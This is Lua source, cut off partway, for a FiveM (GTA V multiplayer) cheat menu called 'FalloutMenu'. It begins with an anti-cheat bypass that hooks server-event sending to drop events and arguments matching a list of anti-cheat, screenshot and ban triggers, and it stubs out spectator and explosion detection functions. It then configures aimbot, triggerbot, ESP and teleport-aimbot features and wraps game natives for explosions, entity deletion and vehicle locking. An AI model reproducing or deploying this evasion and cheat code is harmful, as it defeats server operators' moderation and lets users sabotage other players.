CreateThread(function()

 local rE = {}
rE.Bypasses = {
    Events = {
        "anticheese",
        "anticheat",
        "AC",
        "AntiCheat",
        "ANTI-CHEAT",
        "ACXD",
        "ChocoHax",
        "API-ANTICHEAT",
        "acxd",
        "anticheat",
        "antilynx",
        "discordbot",
        "EasyAdmin:CaptureScreenshot",
        "screenshot",
        "cheat",
        "ncpp",
        "ViolationDetected",
        "godModePass",
        "godModeFail",
        "adminGodmodeCheck",
        "illegalWeapon",
        "ybn_ac",
        "x_anticheat",
        "CMG:ban",
        "Choco:",
        "alpha-tango-golf",
        "AC_SYNC:BAN",
        "foundyou",
        "AntiBlips",
        "AntiSpectate",
        "CarlosLR-AC",
        "globalAC:trigger",
        "NWAC",
        "AC:Sanction",
        "ChXa"
    },
    Args = {
        {"This player tried to bypass the anticheat", "ChocoHax"},
        {"This player tried to stop the anticheat", "ChocoHax"},
        {"This player injected a mod menu", "ChocoHax"},
        {"🍫 AntiChocoStop", "ChocoHax"},
        {"🍫 AntiTeleport", "ChocoHax"},
        {"AntiSpectate", "ChocoHax"},
        {"AntiBlips", "ChocoHax"},
        {"🍫 Secly", "ChocoHax"},
        {"ChocoHax", "ChocoHax"},
        {"HentaiCore", "HentaiCore"},
        {"`ForceSocialClubUpdate` Removal", "ATG"},
        {"Ham Mafia Executor Detected", "ATG"},
        {"Table Emptying in Resource", "ATG"},
        {"Malicious Function Usage", "ATG"},
        {"Player Health above MAX", "ATG"},
        {"Weapon Damage Modified", "ATG"},
        {"Anti-Resource-Restart", "ATG"},
        {"Manipulation Detected", "ATG"},
        {"Native Draw Detection", "ATG"},
        {"Inventory Exploiting", "ATG"},
        {"RedENGINE detection", "ATG"},
        {"Injection detected", "ATG"},
        {"BlacklistedWeapon:", "ATG"},
        {"Anti-Resource-Stop", "ATG"},
        {"Godmode Activated", "ATG"},
        {"AntiModelChanger", "ATG"},
        {"Infinite Health", "ATG"},
        {"Menu Detection", "ATG"},
        {"Cheat Engine", "ATG"},
        {"#GetHammed", "ATG"},
        {"Native Function", "Sanction"},
        {"BAN", "Sanction"},
        {"dont touch my server :O", "API-ANTICHEAT"}
    },
    tfi = TriggerServerEventInternal,
    global = _G
}
function rE.Bypasses:CheckEvent(event)
    for k, v in pairs(rE.Bypasses.Events) do
        if event:lower():find(v:lower(), 1, true) then
            return true
        end
    end
    return false
end
function rE.Bypasses:CheckArgs(args)
    for k, v in pairs(args) do
        if type(v) == "string" then
            for z, x in pairs(rE.Bypasses.Args) do
                if x[1]:lower():find(v:lower(), 1, true) then
                    return true
                end
            end
        end
    end
    return false
end
function TriggerServerEventInternal(event, payload, length)
    if rE.Bypasses:CheckEvent(event) then
        return
    end
    local unpacked_payload = msgpack.unpack(payload)
    if rE.Bypasses:CheckArgs(unpacked_payload) then
        return
    end
    return Citizen.InvokeNative(0x7FDD1128, event, payload, length)
end
CreateThread(
    function()
        for k, v in ipairs(rE.Bypasses.global) do
            if k == "TriggerClientEventInt" or k == "HandleConfig" then
                table.remove(rE.Bypasses.global, v)
            end
        end
        while true do
            _G = rE.Bypasses.global
            Wait(0)
        end
    end
)



function IsExplosionInSphere(...)return false end;function NetworkIsInSpectatorMode()return false end;function ShutdownAndLoadMostRecentSave()return true end;function ActivateRockstarEditor()return end;function ForceSocialClubUpdate()return end;function fuckmedaddy()return end


CreateThread(function()
    local frozen_ents = {}
    local frozen_players = {}
    local friends = {}
    local camX, camY, camZ
    local lift_height = 0.0
    local lift_inc = 0.1
    local rc_camX, rc_camY, rc_camZ
    local notifications_h = 64
    local dict = {
        Citizen = Citizen,
        math = math,
        string = string,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        json = json,
        utf8 = utf8,
        pairs = pairs,
        ipairs = ipairs
    }
    dict.Citizen.IN = Citizen.InvokeNative

    local vector_origin = vector3(0, 0, 0)

    local ZYD = {
        DynamicTriggers = {},
        Painter = {},
        Util = {},
        Categories = {},
        List = {},
        PlayerCache = {},
        Config = {
            Vehicle = {
                Boost = 1.0
            },
            Player = {
                CrossHair = false,
                Blips = true,
                ESP = true,
                ESPDistance = 1000.0,
                Box = false,
                Bone = false,
                OneTap = false,
                Aimbot = false,
                AimbotNeedsLOS = true,
                TriggerBotNeedsLOS = true,
                TPAimbot = false,
                TPAimbotThreshold = 40.0,
                TPAimbotDistance = 2.0,
                RageBot = false,
                TriggerBot = false,
                NoDrop = false,
                AimbotFOV = 90.0,
                AimbotBone = 1,
                AimbotKey = "MOUSE1",
                AimbotReleaseKey = "LEFTALT",
                TriggerBotDistance = 500.0,
                TargetInsideVehicles = false
            },
            UseBackgroundImage = false,
            UseSounds = true,
            UseAutoWalk = false,
            UseAutoWalkAlt = false,
            ShowKey = "INSTERT",
            FreeCamKey = "HOME",
            RCCamKey = "=",
            DisableKey = "-",
            ShowText = true,
            SafeMode = false,
            MenuX = 300,
            MenuY = 300,
            NotifX = nil,
            NotifY = nil,
            NotifW = 420,
            CurrentSelection = 1,
            SelectedCategory = "category_1",
            UsePrintMessages = true
        },
        Name = "FalloutMenu",
        Version = "2.1.3.7",
        Enabled = true,
        Showing = false,
        Base64 = {},
        Tertiary = {255, 205, 30, 255},
        MenuW = 923,
        MenuH = 583,
        DraggingX = nil,
        DraggingY = nil,
        CurrentPlayer = nil
    }

    local zapis_konfigu = {
        ["Taki plik nie istnieje"] = true,
        ["Nie mozna otworzyc tego pliku"] = true,
        ["Nie mozna zapisac configu"] = true,
        ["Nie mozna usunac configu"] = true,
        ["Poprawnie zapisano config"] = true,
        ["Poprawnie usunieto config."] = true
    }

    local current_config = "ZYD_default"

    local function _count(tab)
        local c = 0

        for _ in dict.pairs(tab) do
            c = c + 1
        end

        return c
    end

    ZYD.Base64.CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    function ZYD.Base64:Encode(data)
        return (data:gsub(".", function(x)
            local r, b = "", x:byte()

            for i = 8, 1, -1 do
                r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0')
            end

            return r
        end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
            if (#x < 6) then return '' end
            local c = 0

            for i = 1, 6 do
                c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)
            end

            return self.CharList:sub(c + 1, c + 1)
        end) .. ({'', '==', '='})[#data % 3 + 1]
    end

    function ZYD:CopyTable(tab)
        local out = {}

        for key, val in dict.pairs(tab) do
            if dict.type(val) == "table" then
                out[key] = ZYD:CopyTable(val)
            else
                out[key] = val
            end
        end

        return out
    end

    function ZYD:IsFriend(ped)
        local id = ZYD:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
        if not id or id < 0 then return false end

        return friends[ZYD:GetFunction("GetPlayerServerId")(id)]
    end

    ZYD.DefaultConfig = ZYD:CopyTable(ZYD.Config)

    local boundaryIdx = 1

    local function dummyUseBoundary(idx)
        return nil
    end

    local function getBoundaryFunc(bfn, bid)
        return function(fn, ...)
            local boundary = bid or (boundaryIdx + 1)
            boundaryIdx = boundaryIdx + 1
            bfn(boundary, coroutine.running())

            local wrap = function(...)
                dummyUseBoundary(boundary)
                local v = table.pack(fn(...))

                return table.unpack(v)
            end

            local v = table.pack(wrap(...))
            bfn(boundary, nil)

            return table.unpack(v)
        end
    end

    local runWithBoundaryEnd = getBoundaryFunc(dict.Citizen.SubmitBoundaryEnd)

    local function lookupify(t)
        local r = {}

        for _, v in dict.ipairs(t) do
            r[v] = true
        end

        return r
    end

    local blocked_ranges = {{0x0001F601, 0x0001F64F}, {0x00002702, 0x000027B0}, {0x0001F680, 0x0001F6C0}, {0x000024C2, 0x0001F251}, {0x0001F300, 0x0001F5FF}, {0x00002194, 0x00002199}, {0x000023E9, 0x000023F3}, {0x000025FB, 0x000026FD}, {0x0001F300, 0x0001F5FF}, {0x0001F600, 0x0001F636}, {0x0001F681, 0x0001F6C5}, {0x0001F30D, 0x0001F567}, {0x0001F980, 0x0001F984}, {0x0001F910, 0x0001F918}, {0x0001F6E0, 0x0001F6E5}, {0x0001F920, 0x0001F927}, {0x0001F919, 0x0001F91E}, {0x0001F933, 0x0001F93A}, {0x0001F93C, 0x0001F93E}, {0x0001F985, 0x0001F98F}, {0x0001F940, 0x0001F94F}, {0x0001F950, 0x0001F95F}, {0x0001F928, 0x0001F92F}, {0x0001F9D0, 0x0001F9DF}, {0x0001F9E0, 0x0001F9E6}, {0x0001F992, 0x0001F997}, {0x0001F960, 0x0001F96B}, {0x0001F9B0, 0x0001F9B9}, {0x0001F97C, 0x0001F97F}, {0x0001F9F0, 0x0001F9FF}, {0x0001F9E7, 0x0001F9EF}, {0x0001F7E0, 0x0001F7EB}, {0x0001FA90, 0x0001FA95}, {0x0001F9A5, 0x0001F9AA}, {0x0001F9BA, 0x0001F9BF}, {0x0001F9C3, 0x0001F9CA}, {0x0001FA70, 0x0001FA73}}
    local block_singles = lookupify{0x000000A9, 0x000000AE, 0x0000203C, 0x00002049, 0x000020E3, 0x00002122, 0x00002139, 0x000021A9, 0x000021AA, 0x0000231A, 0x0000231B, 0x000025AA, 0x000025AB, 0x000025B6, 0x000025C0, 0x00002934, 0x00002935, 0x00002B05, 0x00002B06, 0x00002B07, 0x00002B1B, 0x00002B1C, 0x00002B50, 0x00002B55, 0x00003030, 0x0000303D, 0x00003297, 0x00003299, 0x0001F004, 0x0001F0CF, 0x0001F6F3, 0x0001F6F4, 0x0001F6E9, 0x0001F6F0, 0x0001F6CE, 0x0001F6CD, 0x0001F6CF, 0x0001F6CB, 0x00023F8, 0x00023F9, 0x00023FA, 0x0000023, 0x0001F51F, 0x0001F6CC, 0x0001F9C0, 0x0001F6EB, 0x0001F6EC, 0x0001F6D0, 0x00023CF, 0x000002A, 0x0002328, 0x0001F5A4, 0x0001F471, 0x0001F64D, 0x0001F64E, 0x0001F645, 0x0001F646, 0x0001F681, 0x0001F64B, 0x0001F647, 0x0001F46E, 0x0001F575, 0x0001F582, 0x0001F477, 0x0001F473, 0x0001F930, 0x0001F486, 0x0001F487, 0x0001F6B6, 0x0001F3C3, 0x0001F57A, 0x0001F46F, 0x0001F3CC, 0x0001F3C4, 0x0001F6A3, 0x0001F3CA, 0x00026F9, 0x0001F3CB, 0x0001F6B5, 0x0001F6B5, 0x0001F468, 0x0001F469, 0x0001F990, 0x0001F991, 0x0001F6F5, 0x0001F6F4, 0x0001F6D1, 0x0001F6F6, 0x0001F6D2, 0x0002640, 0x0002642, 0x0002695, 0x0001F3F3, 0x0001F1FA, 0x0001F91F, 0x0001F932, 0x0001F931, 0x0001F9F8, 0x0001F9F7, 0x0001F3F4, 0x0001F970, 0x0001F973, 0x0001F974, 0x0001F97A, 0x0001F975, 0x0001F976, 0x0001F9B5, 0x0001F9B6, 0x0001F468, 0x0001F469, 0x0001F99D, 0x0001F999, 0x0001F99B, 0x0001F998, 0x0001F9A1, 0x0001F99A, 0x0001F99C, 0x0001F9A2, 0x0001F9A0, 0x0001F99F, 0x0001F96D, 0x0001F96C, 0x0001F96F, 0x0001F9C2, 0x0001F96E, 0x0001F99E, 0x0001F9C1, 0x0001F6F9, 0x0001F94E, 0x0001F94F, 0x0001F94D, 0x0000265F, 0x0000267E, 0x0001F3F4, 0x0001F971, 0x0001F90E, 0x0001F90D, 0x0001F90F, 0x0001F9CF, 0x0001F9CD, 0x0001F9CE, 0x0001F468, 0x0001F469, 0x0001F9D1, 0x0001F91D, 0x0001F46D, 0x0001F46B, 0x0001F46C, 0x0001F9AE, 0x0001F415, 0x0001F6D5, 0x0001F6FA, 0x0001FA82, 0x0001F93F, 0x0001FA80, 0x0001FA81, 0x0001F97B, 0x0001F9AF, 0x0001FA78, 0x0001FA79, 0x0001FA7A}

    function ZYD:RemoveEmojis(str)
        local new = ""

        for _, codepoint in dict.utf8.codes(str) do
            local safe = true

            if block_singles[codepoint] then
                safe = false
            else
                for _, range in dict.ipairs(blocked_ranges) do
                    if range[1] <= codepoint and codepoint <= range[2] then
                        safe = false
                        break
                    end
                end
            end

            if safe then
                new = new .. dict.utf8.char(codepoint)
            end
        end

        return new
    end

    -- Used to clean player names.
    function ZYD:CleanName(str, is_esp)
        str = str:gsub("~", "")
        str = ZYD:RemoveEmojis(str)

        if #str >= 25 and not is_esp then
            str = str:sub(1, 25) .. "..."
        end

        return str
    end

    local _natives = {
        ["TriggerEvent"] = {
            func = function(eventName, ...)
                if not eventName then return end
                local payload = msgpack.pack({...})

                return runWithBoundaryEnd(function() return TriggerEventInternal(eventName, payload, payload:len()) end)
            end
        },
        ["TriggerServerEvent"] = {
            func = function(eventName, ...)
                if not eventName then return end
                local payload = msgpack.pack({...})

                return TriggerServerEventInternal(eventName, payload, payload:len())
            end
        },
        ["DestroyCam"] = {
            hash = 0x865908C81A2C22E9
        },
        ["GetCurrentServerEndpoint"] = {
            hash = 0xEA11BFBA,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ResultAsString()
            end
        },
        ["GetCurrentResourceName"] = {
            hash = 0xE5E9EBBB,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ResultAsString()
            end
        },
        ["GetGameTimer"] = {
            hash = 0x9CD27B0045628463,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end,
        },
        ["GetActivePlayers"] = {
            hash = 0xcf143fb9,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsObject() end,
            return_as = function(obj) return msgpack.unpack(obj) end
        },
        ["GetVehicleMaxNumberOfPassengers"] = {
            hash = 0xA7C4F2C6E744A550,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["FindFirstVehicle"] = {
            hash = 0x15e55694,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["FindNextVehicle"] = {
            hash = 0x8839120d,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["EndFindVehicle"] = {
            hash = 0x9227415a,
            unpack = function(...)
                local args = (...)

                return args[1]
            end
        },
        ["FindFirstPed"] = {
            hash = 0xfb012961,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["FindNextPed"] = {
            hash = 0xab09b548,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["EndFindPed"] = {
            hash = 0x9615c2ad,
            unpack = function(...)
                local args = (...)

                return args[1]
            end
        },
        ["FindFirstObject"] = {
            hash = 0xFAA6CB5D,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["FindNextObject"] = {
            hash = 0x4E129DBF,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["EndFindObject"] = {
            hash = 0xDEDA4E50,
            unpack = function(...)
                local args = (...)

                return args[1]
            end
        },
        ["GetPlayerServerId"] = {
            hash = 0x4d97bcc7,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetNumResources"] = {
            hash = 0x863f27b,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["GetResourceByFindIndex"] = {
            hash = 0x387246b7,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
            end
        },
        ["LoadResourceFile"] = {
            func = function(...)
                if _Executor ~= "redENGINE" then return end
                local args = {...}

                return dict.Citizen.IN(0xEB01A, LoadResourceFile(args[1], args[2]))
            end
        },
        ["RequestCollisionAtCoord"] = {
            hash = 0x07503F7948F491A7,
            unpack = function(...)
                local args = (...)
                local x, y, z

                if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
                    x = args[1].x
                    y = args[1].y
                    z = args[1].z
                else
                    x = args[1]
                    y = args[2]
                    z = args[3]
                end

                return x, y, z, dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetEntityCoords"] = {
            hash = 0x3FEF770D40960D5A,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["RemoveBlip"] = {
            hash = 0x86A652570E5F25DD,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1])
            end
        },
        ["GetNuiCursorPosition"] = {
            hash = 0xbdba226f,
            unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
        },
        ["DoesEntityExist"] = {
            hash = 0x7239B21A38F536BA,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsEntityDead"] = {
            hash = 0x5F9532F3B5CC2551,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPedDeadOrDying"] = {
            hash = 0x3317DEDB88C95038,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsPedShooting"] = {
            hash = 0x34616828CD07F1A1,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["PlaySoundFrontend"] = {
            hash = 0x67C540AA08E4A6F5,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4]
            end
        },
        ["GetPedInVehicleSeat"] = {
            hash = 0xBB40DD2270B65366,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["HasAnimDictLoaded"] = {
            hash = 0xD031A9162D01088C,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["CreatePed"] = {
            hash = 0xD49F9B0955C367DE,
            unpack = function(...)
                local args = (...)

                return args[1], dict.type(args[2]) == "string" and ZYD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["CreatePedInsideVehicle"] = {
            hash = 0x7DD959874C1FD534,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.type(args[3]) == "string" and ZYD:GetFunction("GetHashKey")(args[3]) or args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["NetworkHasControlOfEntity"] = {
            hash = 0x01BF60A500E28887,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SimulatePlayerInputGait"] = {
            hash = 0x477D5D63E63ECA5D
        },
        ["ResetPedRagdollTimer"] = {
            hash = 0x9FA4664CF62E47E8
        },
        ["IsVehicleDamaged"] = {
            hash = 0xBCDC5017D3CE1E9E,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["ToggleVehicleMod"] = {
            hash = 0x2A1F4F37F95BAD08
        },
        ["NetworkGetPlayerIndexFromPed"] = {
            hash = 0x6C0E2E0125610278,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["ResetPlayerStamina"] = {
            hash = 0xA6F312FCCE9C1DFE
        },
        ["GetEntityAlpha"] = {
            hash = 0x5A47B3B5E63E94C6,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["IsEntityVisible"] = {
            hash = 0x47D6F43D77935C75,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end,
            return_as = function(int) return int == 1 end
        },
        ["AreAnyVehicleSeatsFree"] = {
            hash = 0x2D34FC3BC4ADB780,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end,
            return_as = function(int) return int == 1 end
        },
        ["IsEntityVisibleToScript"] = {
            hash = 0xD796CB5BA8F20E32,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end,
            return_as = function(int) return int == 1 end
        },
        ["NetworkExplodeVehicle"] = {
            hash = 0x301A42153C9AD707
        },
        ["DisplayRadar"] = {
            hash = 0xA0EBB943C300E693
        },
        ["SetCursorLocation"] = {
            hash = 0xFC695459D4D0E219
        },
        ["SetPlayerWeaponDamageModifier"] = {
            hash = 0xCE07B9F7817AADA3
        },
        ["SetPedArmour"] = {
            hash = 0xCEA04D83135264CC
        },
        ["SetEntityLocallyInvisible"] = {
            hash = 0xE135A9FF3F5D05D8
        },
        ["SetVehicleDoorsLockedForPlayer"] = {
            hash = 0x517AAF684BB50CD1
        },
        ["SetVehicleDoorsLockedForAllPlayers"] = {
            hash = 0xA2F80B8D040727CC
        },
        ["SetVehicleDoorsLocked"] = {
            hash = 0xB664292EAECF7FA6
        },
        ["SetVehicleTyresCanBurst"] = {
            hash = 0xEB9DC3C7D8596C46
        },
        ["SetVehicleMod"] = {
            hash = 0x6AF0636DDEDCB6DD
        },
        ["SetPedCoordsKeepVehicle"] = {
            hash = 0x9AFEFF481A85AB2E
        },
        ["SetVehicleEnginePowerMultiplier"] = {
            hash = 0x93A3996368C94158
        },
        ["GetFirstBlipInfoId"] = {
            hash = 0x1BEDE233E6CD2A1F,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetGroundZFor_3dCoord"] = {
            hash = 0xC906A7DAB05C8D2B,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetBlipInfoIdCoord"] = {
            hash = 0xFA7C7F0AADF25D09,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["GetNumVehicleMods"] = {
            hash = 0xE38E9162A2500646,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["SetVehicleModKit"] = {
            hash = 0x1F2AA07F00B3217A
        },
        ["SetPedToRagdoll"] = {
            hash = 0xAE99FB955581844A
        },
        ["SetVehicleFixed"] = {
            hash = 0x115722B1B9C14C1C
        },
        ["SetPedKeepTask"] = {
            hash = 0x971D38760FBC02EF
        },
        ["NetworkGetNetworkIdFromEntity"] = {
            hash = 0xA11700682F3AD45C,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["RemoveWeaponFromPed"] = {
            hash = 0x4899CB088EDF59B8
        },
        ["SetNetworkIdSyncToPlayer"] = {
            hash = 0xA8A024587329F36A
        },
        ["SetNetworkIdCanMigrate"] = {
            hash = 0x299EEB23175895FC
        },
        ["DoesCamExist"] = {
            hash = 0xA7A932170592B50E
        },
        ["CreateCam"] = {
            hash = 0xC3981DCE61D9E13F
        },
        ["GetGameplayCamRot"] = {
            hash = 0x837765A25378F0BB,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["GetCamRot"] = {
            hash = 0x7D304C1C955E3E12,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
            end
        },
        ["StartShapeTestRay"] = {
            hash = 0x377906D8A31E5586,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetShapeTestResult"] = {
            hash = 0x3D87450E15D98694,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueInt(), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end,
            return_as = function(...)
                local ret = {...}

                return ret[1], ret[2] == 1, ret[3], ret[4], ret[5]
            end
        },
        ["AddExplosion"] = {
            hash = 0xE3AD2BDBAEE269AC
        },
        ["CreateVehicle"] = {
            hash = 0xAF35D0D2583051B0,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["SetPedIntoVehicle"] = {
            hash = 0xF75B0D629E1C063D
        },
        ["SetPedAlertness"] = {
            hash = 0xDBA71115ED9941A6
        },
        ["TaskVehicleDriveWander"] = {
            hash = 0x480142959D337D00
        },
        ["CreateObject"] = {
            hash = 0x509D5878EB39E842,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["DeletePed"] = {
            hash = 0x9614299DCB53E54B,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1])
            end
        },
        ["DeleteEntity"] = {
            hash = 0xAE3CBE5BF394C9C9,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1])
            end
        },
        ["DeleteObject"] = {
            hash = 0x539E0AE3E6634B9F,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1])
            end
        },
        ["DeleteVehicle"] = {
            hash = 0xEA386986E786A54F,
            unpack = function(...)
                local args = (...)

                return dict.Citizen.PointerValueIntInitialized(args[1])
            end
        },
        ["NetworkRequestControlOfEntity"] = {
            hash = 0xB69317BF5E782347,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["GetModelDimensions"] = {
            hash = 0x03E8D3D5F549087A,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
            end
        },
        ["GetEntityModel"] = {
            hash = 0x9F47B058362C84B5,
            unpack = function(...)
                local args = (...)

                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["SetEntityAsMissionEntity"] = {
            hash = 0xAD738C3085FE7E11
        },
        ["SetEntityRotation"] = {
            hash = 0x8524A8B0171D5E07
        },
        ["SetEntityLocallyVisible"] = {
            hash = 0x241E289B5C059EDC
        },
        ["SetEntityAlpha"] = {
            hash = 0x44A0870B7E92D7C0
        },
        ["SetEntityCollision"] = {
            hash = 0x1A9205C1B9EE827F
        },
        ["SetEntityCoords"] = {
            hash = 0x06843DA7060A026B
        },
        ["GivePlayerRagdollControl"] = {
            hash = 0x3C49C870E66F0A28
        },
        ["GetHashKey"] = {
            hash = 0xD24D37CC275948CC,
            unpack = function(...)
                local args = (...)

                return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
            end
        },
        ["GetVehiclePedIsIn"] = {
            hash = 0x9A9112A0FE9A4713
        },
        ["PlayerPedId"] = {
            hash = 0xD80958FC74E988A6,
            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
        },
        ["GetPlayerPed"] = {
            hash = 0x43A66C31C68491C0
        },
        ["HasModelLoaded"] = {
            hash = 0x98A4EB5D89A0C952,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["SetPedCanRagdoll"] = {
            hash = 0xB128377056A54E2A
        },
        ["RequestModel"] = {
            hash = 0x963D27A58DF860AC,
            unpack = function(...)
                local args = (...)

                return dict.type(args[1]) == "string" and ZYD:GetFunction("GetHashKey")(args[1]) or args[1]
            end
        },
        ["SetTextFont"] = {
            hash = 0x66E0276CC5F6B9DA
        },
        ["SetTextProportional"] = {
            hash = 0x038C1F517D7FDCF8
        },
        ["HasStreamedTextureDictLoaded"] = {
            hash = 0x0145F696AAAAD2E4
        },
        ["RequestStreamedTextureDict"] = {
            hash = 0xDFA2EF8E04127DD5
        },
        ["GetActiveScreenResolution"] = {
            hash = 0x873C9F3104101DD3,
            unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
        },
        ["IsDisabledControlJustPressed"] = {
            hash = 0x91AEF906BCA88877,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsDisabledControlJustReleased"] = {
            hash = 0x305C8DCD79DA8B0F,
            unpack = function(...)
                local args = (...)

                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
            end
        },
        ["IsDisabledControlPressed"] = {
